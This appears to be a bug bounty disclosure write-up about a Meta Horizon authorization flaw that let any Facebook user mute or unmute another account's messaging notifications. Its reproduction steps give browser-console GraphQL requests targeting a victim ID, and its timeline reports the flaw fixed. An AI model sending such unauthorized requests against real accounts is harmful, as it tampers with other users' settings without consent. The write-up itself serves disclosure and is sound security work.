---
title: Toggle Messaging Notification for Any Meta Horizon Account
description: Unauthorized ability to toggle messaging notifications for any Meta Horizon account, allowing attackers to manipulate victims’ settings remotely.
date: 2025-10-18 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---


### 🧾 Description
The issue allows any authenticated Facebook user to toggle the messaging notification status (mute/unmute) for any other Meta Horizon account without authorization.  
This is an authorization and privacy flaw, allowing attackers to manipulate other users’ notification settings remotely.  

---

### ⚙️ Steps to Reproduce

1. Log into your Facebook account and open the browser console.  
2. Submit the following request (replace `ID_HORIZON_USER_VICTIM` with the victim’s Horizon ID):

```js
new AsyncRequest('/api/graphql?variables={"input":{"client_mutation_id":"5","actor_id":0,"horizon_messaging_id":"ID_HORIZON_USER_VICTIM","should_mute":true}}&doc_id=6728699350577194').send()
```

3. Visit the victim’s Horizon account, the messaging notification status will have changed to ON.  
4. Change `"should_mute"` to `false` and send again:

```js
new AsyncRequest('/api/graphql?variables={"input":{"client_mutation_id":"5","actor_id":0,"horizon_messaging_id":"ID_HORIZON_USER_VICTIM","should_mute":false}}&doc_id=6728699350577194').send()
```

✅ You will notice that the victim’s status is now OFF.

**Result:** The attacker can toggle another user’s Horizon messaging notifications at will.  

---

## Timeline

- **Reported:** January 8, 2025
- **Triaged:** January 19, 2025
- **Fixed:** January 29, 2025
- **Reward:** January 29, 2025

---
